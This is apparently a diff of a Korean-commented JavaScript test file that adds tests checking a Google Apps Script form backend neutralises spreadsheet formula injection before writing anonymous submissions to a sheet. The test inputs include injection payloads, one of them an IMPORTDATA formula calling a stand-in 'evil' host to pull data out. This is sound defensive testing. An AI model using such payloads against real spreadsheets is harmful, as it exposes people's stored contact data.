@@ -67,8 +67,9 @@ test('카드 HTML — 제출·자동저장·허니팟·퀴즈 배선', () => {
     assert.ok(html.includes('id="synkHp"'), `[${name}] 허니팟 입력 없음`);
     assert.ok(html.includes("form:'crew_card'"), `[${name}] 제출 페이로드 form 식별자 없음`);
     assert.ok(html.includes('hp: (document.getElementById'), `[${name}] 허니팟이 페이로드에 안 실린다`);
-    // 08-04 실측: charset 없는 POST는 한글·키릴이 U+FFFD로 깨져 저장된다 — 브라우저 기본값에 기대지 않는다
-    assert.ok(/'Content-Type':\s*'text\/plain;charset=UTF-8'/.test(html), `[${name}] 제출 fetch에 charset=UTF-8 명시가 없다 — 몽골어 학생 데이터가 깨질 수 있다`);
+    // 브라우저 기본값 의존을 없애는 명시화(08-04). ⚠ 이건 인코딩 버그의 수정이 아니다 —
+    // 깨짐의 원인은 헤더가 아니라 Windows 셸의 CP949 인코딩이었고, 재실측으로 정정됐다.
+    assert.ok(/'Content-Type':\s*'text\/plain;charset=UTF-8'/.test(html), `[${name}] 제출 fetch의 Content-Type 명시가 사라졌다`);
     assert.ok(!html.includes('크루카드_토큰') && !html.includes('SYNK_ENDPOINT.token'), `[${name}] 무토큰 결정 위반 — 클라이언트에 토큰 언급 잔재`);
     assert.ok(html.includes('quiz (.quiz-opts)'), `[${name}] 퀴즈 수집 패스 없음 — Q1~Q4가 시트에 안 간다`);
     assert.ok(html.includes('quiz single-select'), `[${name}] 퀴즈 단일선택 배선 없음`);
@@ -100,6 +101,37 @@ test('서버 보안 불변식 — doGet 무부작용·hp 선차단·일일상한
   }
   assert.ok(doPost.includes("error: 'internal'"), '내부 오류를 밖으로 흘리지 않는 응답이 사라졌다');
   assert.ok(server.includes('MAX_CELL'), '셀 길이 상한 소실');
+});
+
+test('수식 인젝션 차단 — 셀안전_가 정본과 같고 실제로 막는다', () => {
+  // 계기(08-04 적대 리뷰): 익명 POST 한 번으로 crew_cards에 라이브 수식이 착지하고, 같은
+  // 스프레드시트의 상담 연락처가 IMPORTDATA로 빠져나갈 수 있었다. [v9.153] profiles와 같은 계열.
+  const grab = (src) => {
+    const m = src.match(/function 셀안전_\(v\)[\s\S]*?\n\}/);
+    assert.ok(m, '셀안전_ 정의를 찾지 못했다');
+    return m[0].replace(/\r\n/g, '\n');
+  };
+  const canon = grab(read('상담AI.js'));
+  const local = grab(server);
+  assert.equal(local, canon, 'crewcard 사본이 정본과 갈렸다 — 한쪽만 고치면 방어가 반쪽이 된다');
+
+  // 문자열 존재가 아니라 동작으로 검사한다(가드는 「적용된 결과」를 본다)
+  const body = local.slice(local.indexOf('{') + 1, local.lastIndexOf('}'));
+  const 셀안전_ = new Function('v', body);
+  ['=IMPORTDATA("https://evil/x")', '+1+1', '-1', '@SUM(A1)', '\tx', '\rx'].forEach((bad) => {
+    assert.equal(셀안전_(bad), "'" + bad, `위험 접두를 못 막았다: ${JSON.stringify(bad)}`);
+  });
+  ['홍길동', 'Батбаяр', '010-1234-5678', '', 'a=b'].forEach((ok) => {
+    assert.equal(셀안전_(ok), ok, `정상 값을 건드렸다: ${JSON.stringify(ok)}`);
+  });
+});
+
+test('수식 인젝션 차단 — doPost의 시트 쓰기 경로가 전부 소독을 지난다', () => {
+  const doPost = server.slice(server.indexOf('function doPost'), server.indexOf('function 크루_탭_'));
+  assert.ok(doPost.includes('return 셀안전_(String(v).slice(0, MAX_CELL))'),
+    '사용자 입력이 소독 없이 appendRow로 간다 — 익명 수식 인젝션 재개통');
+  assert.ok(doPost.includes('return 셀안전_(String(body.lang'), 'lang(요청 본문)이 소독을 안 지난다');
+  assert.ok(!/return String\(v\)\.slice/.test(doPost), '소독 없는 원시 반환 경로가 남아 있다');
 });
 
 test('HtmlService 노출 표면 — 밑줄 없는 전역 함수는 doGet·doPost뿐', () => {
